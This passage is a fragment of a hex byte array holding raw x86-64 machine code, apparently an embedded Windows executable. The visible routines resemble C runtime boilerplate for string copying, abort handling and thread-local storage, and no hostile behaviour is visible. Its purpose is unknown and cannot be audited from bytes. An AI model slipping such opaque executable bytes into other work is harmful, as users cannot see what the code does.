0x0, 0x0, 0xbb, 0x16, 0x0, 0x0, 0x0, 0x89, 0x18, 0xe8, 0xde, 0xd, 0x0, 0x0, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x4c, 0x8b, 0xc9, 0x4c, 0x2b, 0xc1, 0x43, 0x8a, 0x4, 0x8, 0x41, 0x88, 0x1, 0x49, 0xff, 0xc1, 0x84, 0xc0, 0x74, 0xe4, 0x48, 0x83, 0xea, 0x1, 0x75, 0xec, 0x48, 0x85, 0xd2, 0x75, 0xd9, 0x88, 0x19, 0xe8, 0xec, 0xe, 0x0, 0x0, 0xbb, 0x22, 0x0, 0x0, 0x0, 0xeb, 0xc4, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x3b, 0x34, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0xa, 0xb9, 0x16, 0x0, 0x0, 0x0, 0xe8, 0x7c, 0x34, 0x0, 0x0, 0xf6, 0x5, 0xad, 0x34, 0x1, 0x0, 0x2, 0x74, 0x2a, 0xb9, 0x17, 0x0, 0x0, 0x0, 0xff, 0x15, 0xf8, 0x93, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x7, 0xb9, 0x7, 0x0, 0x0, 0x0, 0xcd, 0x29, 0x41, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xba, 0x15, 0x0, 0x0, 0x40, 0x41, 0x8d, 0x48, 0x2, 0xe8, 0x8d, 0xa, 0x0, 0x0, 0xb9, 0x3, 0x0, 0x0, 0x0, 0xe8, 0x83, 0xf5, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x40, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x83, 0x39, 0x0, 0x48, 0x8b, 0xf9, 0x75, 0x49, 0x48, 0x89, 0x5c, 0x24, 0x38, 0xff, 0x15, 0xd6, 0x93, 0x0, 0x0, 0x80, 0x7f, 0x10, 0x0, 0x89, 0x44, 0x24, 0x30, 0x75, 0xc, 0x33, 0xd2, 0xc6, 0x47, 0x10, 0x1, 0x48, 0x89, 0x57, 0x8, 0xeb, 0x4, 0x48, 0x8b, 0x57, 0x8, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0xe8, 0x72, 0x7, 0x0, 0x0, 0x8b, 0x4c, 0x24, 0x30, 0x48, 0x8b, 0xd8, 0x48, 0x89, 0x7, 0xff, 0x15, 0xaa, 0x93, 0x0, 0x0, 0x48, 0x85, 0xdb, 0x48, 0x8b, 0x5c, 0x24, 0x38, 0x74, 0x9, 0x48, 0x8b, 0x7, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xe8, 0x3e, 0xff, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xf9, 0xe8, 0x79, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x57, 0x18, 0x48, 0x8b, 0xc8, 0x48, 0x8b, 0xf0, 0x4c, 0x8b, 0x80, 0x90, 0x0, 0x0, 0x0, 0x4c, 0x89, 0x2, 0x4c, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x4c, 0x89, 0x47, 0x20, 0x4c, 0x8b, 0x47, 0x8, 0xe8, 0xd5, 0x3b, 0x0, 0x0, 0x4c, 0x8b, 0x47, 0x8, 0x48, 0x8d, 0x57, 0x20, 0x48, 0x8b, 0xce, 0xe8, 0x31, 0x3c, 0x0, 0x0, 0x8b, 0x86, 0xa8, 0x3, 0x0, 0x0, 0xa8, 0x2, 0x75, 0xd, 0x83, 0xc8, 0x2, 0x89, 0x86, 0xa8, 0x3, 0x0, 0x0, 0xc6, 0x47, 0x28, 0x2, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x2b, 0xd1, 0x4d, 0x85, 0xc0, 0x74, 0x6a, 0xf7, 0xc1, 0x7, 0x0, 0x0, 0x0, 0x74, 0x1d, 0xf, 0xb6, 0x1, 0x3a, 0x4, 0xa, 0x75, 0x5d, 0x48, 0xff, 0xc1, 0x49, 0xff, 0xc8, 0x74, 0x52, 0x84, 0xc0, 0x74, 0x4e, 0x48, 0xf7, 0xc1, 0x7, 0x0, 0x0, 0x0, 0x75, 0xe3, 0x49, 0xbb, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x49, 0xba, 0xff, 0xfe, 0xfe, 0xfe, 0xfe, 0xfe, 0xfe, 0xfe, 0x8d, 0x4, 0xa, 0x25, 0xff, 0xf, 0x0, 0x0, 0x3d, 0xf8, 0xf, 0x0, 0x0, 0x77, 0xc0, 0x48, 0x8b, 0x1, 0x48, 0x3b, 0x4, 0xa, 0x75, 0xb7, 0x48, 0x83, 0xc1, 0x8, 0x49, 0x83, 0xe8, 0x8, 0x76, 0xf, 0x4d, 0x8d, 0xc, 0x2, 0x48, 0xf7, 0xd0, 0x49, 0x23, 0xc1, 0x49, 0x85, 0xc3, 0x74, 0xcf, 0x33, 0xc0, 0xc3, 0x48, 0x1b, 0xc0, 0x48, 0x83, 0xc8, 0x1, 0xc3, 0xcc, 0xcc, 0xcc, 0xe9, 0x23, 0xd, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x4d, 0x85, 0xc0, 0x75, 0x18, 0x33, 0xc0, 0xc3, 0xf, 0xb7, 0x1, 0x66, 0x85, 0xc0, 0x74, 0x13, 0x66, 0x3b, 0x2, 0x75, 0xe, 0x48, 0x83, 0xc1, 0x2, 0x48, 0x83, 0xc2, 0x2, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xe5, 0xf, 0xb7, 0x1, 0xf, 0xb7, 0xa, 0x2b, 0xc1, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xa, 0xe8, 0x48, 0x7, 0x0, 0x0, 0x90, 0x48, 0x8b, 0x7, 0x48, 0x8b, 0x8, 0x48, 0x8b, 0x81, 0x88, 0x0, 0x0, 0x0, 0xf0, 0xff, 0x0, 0x8b, 0xb, 0xe8, 0x84, 0x7, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xa, 0xe8, 0x8, 0x7, 0x0, 0x0, 0x90, 0x48, 0x8b, 0xf, 0x33, 0xd2, 0x48, 0x8b, 0x9, 0xe8, 0xa6, 0x2, 0x0, 0x0, 0x90, 0x8b, 0xb, 0xe8, 0x46, 0x7, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xa, 0xe8, 0xc8, 0x6, 0x0, 0x0, 0x90, 0x48, 0x8b, 0x47, 0x8, 0x48, 0x8b, 0x10, 0x48, 0x8b, 0xf, 0x48, 0x8b, 0x12, 0x48, 0x8b, 0x9, 0xe8, 0x5e, 0x2, 0x0, 0x0, 0x90, 0x8b, 0xb, 0xe8, 0xfe, 0x6, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xa, 0xe8, 0x80, 0x6, 0x0, 0x0, 0x90, 0x48, 0x8b, 0x7, 0x48, 0x8b, 0x8, 0x48, 0x8b, 0x89, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc9, 0x74, 0x1e, 0x83, 0xc8, 0xff, 0xf0, 0xf, 0xc1, 0x1, 0x83, 0xf8, 0x1, 0x75, 0x12, 0x48, 0x8d, 0x5, 0xd2, 0x31, 0x1, 0x0, 0x48, 0x3b, 0xc8, 0x74, 0x6, 0xe8, 0x58, 0xc, 0x0, 0x0, 0x90, 0x8b, 0xb, 0xe8, 0x9c, 0x6, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0x40, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x50, 0x48, 0x89, 0x4d, 0xd8, 0x48, 0x8d, 0x45, 0xd8, 0x48, 0x89, 0x45, 0xe8, 0x4c, 0x8d, 0x4d, 0x20, 0xba, 0x1, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x45, 0xe8, 0xb8, 0x5, 0x0, 0x0, 0x0, 0x89, 0x45, 0x20, 0x89, 0x45, 0x28, 0x48, 0x8d, 0x45, 0xd8, 0x48, 0x89, 0x45, 0xf0, 0x48, 0x8d, 0x45, 0xe0, 0x48, 0x89, 0x45, 0xf8, 0xb8, 0x4, 0x0, 0x0, 0x0, 0x89, 0x45, 0xd0, 0x89, 0x45, 0xd4, 0x48, 0x8d, 0x5, 0x3d, 0x47, 0x1, 0x0, 0x48, 0x89, 0x45, 0xe0, 0x89, 0x51, 0x28, 0x48, 0x8d, 0xd, 0x37, 0xa3, 0x0, 0x0, 0x48, 0x8b, 0x45, 0xd8, 0x48, 0x89, 0x8, 0x48, 0x8d, 0xd, 0x49, 0x31, 0x1, 0x0, 0x48, 0x8b, 0x45, 0xd8, 0x89, 0x90, 0xa8, 0x3, 0x0, 0x0, 0x48, 0x8b, 0x45, 0xd8, 0x48, 0x89, 0x88, 0x88, 0x0, 0x0, 0x0, 0x8d, 0x4a, 0x42, 0x48, 0x8b, 0x45, 0xd8, 0x48, 0x8d, 0x55, 0x28, 0x66, 0x89, 0x88, 0xbc, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x45, 0xd8, 0x66, 0x89, 0x88, 0xc2, 0x1, 0x0, 0x0, 0x48, 0x8d, 0x4d, 0x18, 0x48, 0x8b, 0x45, 0xd8, 0x48, 0x83, 0xa0, 0xa0, 0x3, 0x0, 0x0, 0x0, 0xe8, 0x26, 0xfe, 0xff, 0xff, 0x4c, 0x8d, 0x4d, 0xd0, 0x4c, 0x8d, 0x45, 0xf0, 0x48, 0x8d, 0x55, 0xd4, 0x48, 0x8d, 0x4d, 0x18, 0xe8, 0x91, 0xfe, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x50, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x85, 0xc9, 0x74, 0x1a, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0xe8, 0xe, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x5a, 0xb, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x40, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8d, 0x45, 0xe8, 0x48, 0x89, 0x4d, 0xe8, 0x48, 0x89, 0x45, 0xf0, 0x48, 0x8d, 0x15, 0x88, 0xa2, 0x0, 0x0, 0xb8, 0x5, 0x0, 0x0, 0x0, 0x89, 0x45, 0x20, 0x89, 0x45, 0x28, 0x48, 0x8d, 0x45, 0xe8, 0x48, 0x89, 0x45, 0xf8, 0xb8, 0x4, 0x0, 0x0, 0x0, 0x89, 0x45, 0xe0, 0x89, 0x45, 0xe4, 0x48, 0x8b, 0x1, 0x48, 0x3b, 0xc2, 0x74, 0xc, 0x48, 0x8b, 0xc8, 0xe8, 0xa, 0xb, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x8b, 0x49, 0x70, 0xe8, 0xfd, 0xa, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x8b, 0x49, 0x58, 0xe8, 0xf0, 0xa, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x8b, 0x49, 0x60, 0xe8, 0xe3, 0xa, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x8b, 0x49, 0x68, 0xe8, 0xd6, 0xa, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x8b, 0x49, 0x48, 0xe8, 0xc9, 0xa, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x8b, 0x49, 0x50, 0xe8, 0xbc, 0xa, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x8b, 0x49, 0x78, 0xe8, 0xaf, 0xa, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x8b, 0x89, 0x80, 0x0, 0x0, 0x0, 0xe8, 0x9f, 0xa, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x8b, 0x89, 0xc0, 0x3, 0x0, 0x0, 0xe8, 0x8f, 0xa, 0x0, 0x0, 0x4c, 0x8d, 0x4d, 0x20, 0x4c, 0x8d, 0x45, 0xf0, 0x48, 0x8d, 0x55, 0x28, 0x48, 0x8d, 0x4d, 0x18, 0xe8, 0xd6, 0xfd, 0xff, 0xff, 0x4c, 0x8d, 0x4d, 0xe0, 0x4c, 0x8d, 0x45, 0xf8, 0x48, 0x8d, 0x55, 0xe4, 0x48, 0x8d, 0x4d, 0x18, 0xe8, 0x39, 0xfd, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x40, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0x89, 0x90, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc9, 0x74, 0x2c, 0xe8, 0x1b, 0x3d, 0x0, 0x0, 0x48, 0x8b, 0x8f, 0x90, 0x0, 0x0, 0x0, 0x48, 0x3b, 0xd, 0x75, 0x45, 0x1, 0x0, 0x74, 0x17, 0x48, 0x8d, 0x5, 0xd4, 0x34, 0x1, 0x0, 0x48, 0x3b, 0xc8, 0x74, 0xb, 0x83, 0x79, 0x10, 0x0, 0x75, 0x5, 0xe8, 0xf4, 0x3a, 0x0, 0x0, 0x48, 0x89, 0x9f, 0x90, 0x0, 0x0, 0x0, 0x48, 0x85, 0xdb, 0x74, 0x8, 0x48, 0x8b, 0xcb, 0xe8, 0x54, 0x3a, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x8b, 0xd, 0x48, 0x2f, 0x1, 0x0, 0x83, 0xf9, 0xff, 0x74, 0x2a, 0xe8, 0x3a, 0x28, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 0x1d, 0x8b, 0xd, 0x30, 0x2f, 0x1, 0x0, 0x33, 0xd2, 0xe8, 0x2d, 0x28, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x6d, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0xcb, 0xe8, 0xb9, 0x9, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0xff, 0x15, 0x6b, 0x8e, 0x0, 0x0, 0x8b, 0xd, 0xf5, 0x2e, 0x1, 0x0, 0x33, 0xf6, 0x8b, 0xd8, 0x83, 0xf9, 0xff, 0x74, 0x1d, 0xe8, 0xe3, 0x27, 0x0, 0x0, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x74, 0xa, 0x48, 0x83, 0xf8, 0xff, 0x48, 0xf, 0x44, 0xfe, 0xeb, 0x72, 0x8b, 0xd, 0xcf, 0x2e, 0x1, 0x0, 0x48, 0x83, 0xca, 0xff, 0xe8, 0xca, 0x27, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x5, 0x48, 0x8b, 0xfe, 0xeb, 0x5a, 0xba, 0xc8, 0x3, 0x0, 0x0, 0xb9, 0x1, 0x0, 0x0, 0x0, 0xe8, 0xd6, 0x8, 0x0, 0x0, 0x8b, 0xd, 0xa8, 0x2e, 0x1, 0x0, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x75, 0x10, 0x33, 0xd2, 0xe8, 0x9d, 0x27, 0x0, 0x0, 0x33, 0xc9, 0xe8, 0x32, 0x9, 0x0, 0x0, 0xeb, 0xce, 0x48, 0x8b, 0xd7, 0xe8, 0x8c, 0x27, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x12, 0x8b, 0xd, 0x7e, 0x2e, 0x1, 0x0, 0x33, 0xd2, 0xe8, 0x7b, 0x27, 0x0, 0x0, 0x48, 0x8b, 0xcf, 0xeb, 0xdb, 0x48, 0x8b, 0xcf, 0xe8, 0xc6, 0xfc, 0xff, 0xff, 0x33, 0xc9, 0xe8, 0x3, 0x9, 0x0, 0x0, 0x8b, 0xcb, 0xff, 0x15, 0xd3, 0x8d, 0x0, 0x0, 0x48, 0x85, 0xff, 0x74, 0x13, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0xc7, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xe8, 0x62, 0xf9, 0xff, 0xff, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x8b, 0xd, 0x30, 0x2e, 0x1, 0x0, 0x83, 0xf9, 0xff, 0x74, 0x1b, 0xe8, 0x22, 0x27, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 0x8, 0x48, 0x83, 0xf8, 0xff, 0x74, 0x78, 0xeb, 0x6d, 0x8b, 0xd, 0x10, 0x2e, 0x1, 0x0, 0x48, 0x83, 0xca, 0xff, 0xe8, 0xb, 0x27, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x63, 0xba, 0xc8, 0x3, 0x0, 0x0, 0xb9, 0x1, 0x0, 0x0, 0x0, 0xe8, 0x1c, 0x8, 0x0, 0x0, 0x8b, 0xd, 0xee, 0x2d, 0x1, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0x10, 0x33, 0xd2, 0xe8, 0xe3, 0x26, 0x0, 0x0, 0x33, 0xc9, 0xe8, 0x78, 0x8, 0x0, 0x0, 0xeb, 0x36, 0x48, 0x8b, 0xd3, 0xe8, 0xd2, 0x26, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x12, 0x8b, 0xd, 0xc4, 0x2d, 0x1, 0x0, 0x33, 0xd2, 0xe8, 0xc1, 0x26, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xeb, 0xdb, 0x48, 0x8b, 0xcb, 0xe8, 0xc, 0xfc, 0xff, 0xff, 0x33, 0xc9, 0xe8, 0x49, 0x8, 0x0, 0x0, 0x48, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xe8, 0xbf, 0xf8, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0xff, 0x15, 0xf3, 0x8c, 0x0, 0x0, 0x8b, 0xd, 0x7d, 0x2d, 0x1, 0x0, 0x33, 0xf6, 0x8b, 0xd8, 0x83, 0xf9, 0xff, 0x74, 0x1d, 0xe8, 0x6b, 0x26, 0x0, 0x0, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x74, 0xa, 0x48, 0x83, 0xf8, 0xff, 0x48, 0xf, 0x44, 0xfe, 0xeb, 0x72, 0x8b, 0xd, 0x57, 0x2d, 0x1, 0x0, 0x48, 0x83, 0xca, 0xff, 0xe8, 0x52, 0x26, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x5, 0x48, 0x8b, 0xfe, 0xeb, 0x5a, 0xba, 0xc8, 0x3, 0x0, 0x0, 0xb9, 0x1, 0x0, 0x0, 0x0, 0xe8, 0x5e, 0x7, 0x0, 0x0, 0x8b, 0xd, 0x30, 0x2d, 0x1, 0x0, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x75, 0x10, 0x33, 0xd2, 0xe8, 0x25, 0x26, 0x0, 0x0, 0x33, 0xc9, 0xe8, 0xba, 0x7, 0x0, 0x0, 0xeb, 0xce, 0x48, 0x8b, 0xd7, 0xe8, 0x14, 0x26, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x12, 0x8b, 0xd, 0x6, 0x2d, 0x1, 0x0, 0x33, 0xd2, 0xe8, 0x3, 0x26, 0x0, 0x0, 0x48, 0x8b, 0xcf, 0xeb, 0xdb, 0x48, 0x8b, 0xcf, 0xe8, 0x4e, 0xfb, 0xff, 0xff, 0x33, 0xc9, 0xe8, 0x8b, 0x7, 0x0, 0x0, 0x8b, 0xcb, 0xff, 0x15, 0x5b, 0x8c, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0xc7, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x8b, 0xd, 0xbb, 0x2c, 0x1, 0x0, 0x33, 0xdb, 0x48, 0x8b, 0xf2, 0x83, 0xf9, 0xff, 0x74, 0x1b, 0xe8, 0xa8, 0x25, 0x0, 0x0, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x74, 0x8, 0x48, 0x83, 0xf8, 0xff, 0x74, 0x79, 0xeb, 0x6d, 0x8b, 0xd, 0x96, 0x2c, 0x1, 0x0, 0x48, 0x83, 0xca, 0xff, 0xe8, 0x91, 0x25, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x64, 0xba, 0xc8, 0x3, 0x0, 0x0, 0xb9, 0x1, 0x0, 0x0, 0x0, 0xe8, 0xa2, 0x6, 0x0, 0x0, 0x8b, 0xd, 0x74, 0x2c, 0x1, 0x0, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x75, 0x10, 0x33, 0xd2, 0xe8, 0x69, 0x25, 0x0, 0x0, 0x33, 0xc9, 0xe8, 0xfe, 0x6, 0x0, 0x0, 0xeb, 0x37, 0x48, 0x8b, 0xd7, 0xe8, 0x58, 0x25, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x12, 0x8b, 0xd, 0x4a, 0x2c, 0x1, 0x0, 0x33, 0xd2, 0xe8, 0x47, 0x25, 0x0, 0x0, 0x48, 0x8b, 0xcf, 0xeb, 0xdb, 0x48, 0x8b, 0xcf, 0xe8, 0x92, 0xfa, 0xff, 0xff, 0x33, 0xc9, 0xe8, 0xcf, 0x6, 0x0, 0x0, 0x48, 0x69, 0xde, 0xc8, 0x3, 0x0, 0x0, 0x48, 0x3, 0xdf, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8d, 0xd, 0x31, 0xfb, 0xff, 0xff, 0xe8, 0xec, 0x24, 0x0, 0x0, 0x89, 0x5, 0xfa, 0x2b, 0x1, 0x0, 0x83, 0xf8, 0xff, 0x75, 0x4, 0x32, 0xc0, 0xeb, 0x15, 0xe8, 0x54, 0xfe, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x75, 0x9, 0x33, 0xc9, 0xe8, 0xc, 0x0, 0x0, 0x0, 0xeb, 0xe9, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x8b, 0xd, 0xca, 0x2b, 0x1, 0x0, 0x83, 0xf9, 0xff, 0x74, 0xc, 0xe8, 0xb4, 0x24, 0x0, 0x0, 0x83, 0xd, 0xb9, 0x2b, 0x1, 0x0, 0xff, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x33, 0xdb, 0x48, 0x8d, 0x15, 0x21, 0x39, 0x1, 0x0, 0x45, 0x33, 0xc0, 0x48, 0x8d, 0xc, 0x9b, 0x48, 0x8d, 0xc, 0xca, 0xba, 0xa0, 0xf, 0x0, 0x0, 0xe8, 0x98, 0x24, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x11, 0xff, 0x5, 0x32, 0x3b, 0x1, 0x0, 0xff, 0xc3, 0x83, 0xfb, 0xe, 0x72, 0xd3, 0xb0, 0x1, 0xeb, 0x9, 0x33, 0xc9, 0xe8, 0x24, 0x0, 0x0, 0x0, 0x32, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x48, 0x63, 0xc1, 0x48, 0x8d, 0xc, 0x80, 0x48, 0x8d, 0x5, 0xda, 0x38, 0x1, 0x0, 0x48, 0x8d, 0xc, 0xc8, 0x48, 0xff, 0x25, 0xcf, 0x8a, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x8b, 0x1d, 0xf0, 0x3a, 0x1, 0x0, 0xeb, 0x1d, 0x48, 0x8d, 0x5, 0xb7, 0x38, 0x1, 0x0, 0xff, 0xcb, 0x48, 0x8d, 0xc, 0x9b, 0x48, 0x8d, 0xc, 0xc8, 0xff, 0x15, 0xb7, 0x8a, 0x0, 0x0, 0xff, 0xd, 0xd1, 0x3a, 0x1, 0x0, 0x85, 0xdb, 0x75, 0xdf, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0x48, 0x63, 0xc1, 0x48, 0x8d, 0xc, 0x80, 0x48, 0x8d, 0x5, 0x86, 0x38, 0x1, 0x0, 0x48, 0x8d, 0xc, 0xc8, 0x48, 0xff, 0x25, 0x83, 0x8a, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x33, 0xdb, 0x89, 0x5c, 0x24, 0x30, 0x65, 0x48, 0x8b, 0x4, 0x25, 0x60, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x48, 0x20, 0x39, 0x59, 0x8, 0x7c, 0x11, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0xe8, 0x20, 0x23, 0x0, 0x0, 0x83, 0x7c, 0x24, 0x30, 0x1, 0x74, 0x5, 0xbb, 0x1, 0x0, 0x0, 0x0, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x31, 0x33, 0xff, 0x48, 0x8b, 0xd9, 0x48, 0x85, 0xf6, 0x75, 0x3b, 0xff, 0x15, 0xa, 0x8a, 0x0, 0x0, 0x89, 0x44, 0x24, 0x30, 0x40, 0x38, 0x7b, 0x10, 0x75, 0xa, 0x48, 0x89, 0x7b, 0x8, 0xc6, 0x43, 0x10, 0x1, 0xeb, 0x4, 0x48, 0x8b, 0x7b, 0x8, 0x48, 0x8b, 0xd7, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0xe8, 0xa5, 0xfd, 0xff, 0xff, 0x8b, 0x4c, 0x24, 0x30, 0x48, 0x8b, 0xf0, 0x48, 0x89, 0x3, 0xff, 0x15, 0xdd, 0x89, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x38, 0x48, 0x8b, 0xc6, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x33, 0xdb, 0x48, 0x8b, 0xfa, 0x48, 0x8b, 0xf1, 0x38, 0x5a, 0x10, 0x75, 0x18, 0xff, 0x15, 